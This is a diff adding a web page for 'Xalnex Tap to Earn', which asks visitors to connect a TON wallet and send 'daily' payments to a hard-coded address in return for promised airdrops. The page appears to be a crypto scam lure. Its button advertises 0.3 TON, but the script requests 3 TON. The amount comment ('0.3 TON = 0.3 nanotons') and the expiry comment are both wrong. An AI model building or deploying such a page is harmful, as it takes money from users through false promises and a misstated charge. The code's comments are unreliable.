@@ -1,0 +1,79 @@
+<!DOCTYPE html>
+<html lang="en">
+<head>
+    <meta charset="UTF-8">
+    <title>Xalnex Tap to Earn - TON Transaction</title>
+    <!-- Include TON Connect UI Library -->
+    <script src="https://unpkg.com/@tonconnect/ui@latest/dist/tonconnect-ui.min.js"></script>
+    
+    <style>
+        body {
+background-color: red;
+            font-family: Arial, sans-serif;
+            text-align: center;
+            margin-top: 50px;
+        }
+        #ton-connect {
+            margin-bottom: 20px;
+        }
+        #send-transaction {
+            display: none;
+            padding: 10px 20px;
+            font-size: 16px;
+            cursor: pointer;
+        }
+    </style>
+</head>
+<body>
+    <h1>Xalnex Tap to Earn</h1>
+    <p>Connect your wallet to send TON tokens, And recieve Airdrops at the end.</p>
+    <!-- Connect Button -->
+    <div id="ton-connect"></div>
+
+    <!-- Send Transaction Button -->
+    <button id="send-transaction">Send 0.3 TON DALIY</button>
+
+    <script>
+        // Initialize TON Connect UI
+        const tonConnectUI = new TON_CONNECT_UI.TonConnectUI({
+            manifestUrl: 'https://yourdomain.com/tonconnect-manifest.json', // Update with your manifest URL
+            buttonRootId: 'ton-connect'
+        });
+
+        // Handle connection events
+        tonConnectUI.onStatusChange((wallet) => {
+            const sendButton = document.getElementById('send-transaction');
+            if (wallet) {
+                // Wallet connected
+                sendButton.style.display = 'inline-block';
+            } else {
+                // Wallet disconnected
+                sendButton.style.display = 'none';
+            }
+        });
+
+        // Send TON Transaction
+        document.getElementById('send-transaction').addEventListener('click', async () => {
+            const transaction = {
+                validUntil: Date.now() + 5 * 60 * 1000, // 2 minutes from now
+                messages: [
+                    {
+                        address: 'UQDKHIKHrWjBiJhngnffyul5rCWTQIkzwZ5nMt8I5VeZ8BcT', // Recipient address
+                        amount: '3000000000' // Amount in nanotons (0.3 TON = 0.3 nanotons)
+                    }
+                ]
+            };
+
+            try {
+                const result = await tonConnectUI.sendTransaction(transaction);
+                alert('Transaction sent successfully!');
+                console.log('Transaction sent:', result);
+            } catch (error) {
+                alert('Transaction failed. Please try again.');
+                console.error('Transaction failed:', error);
+            }
+        })
+    </script>
+     
+</body>
+</html>
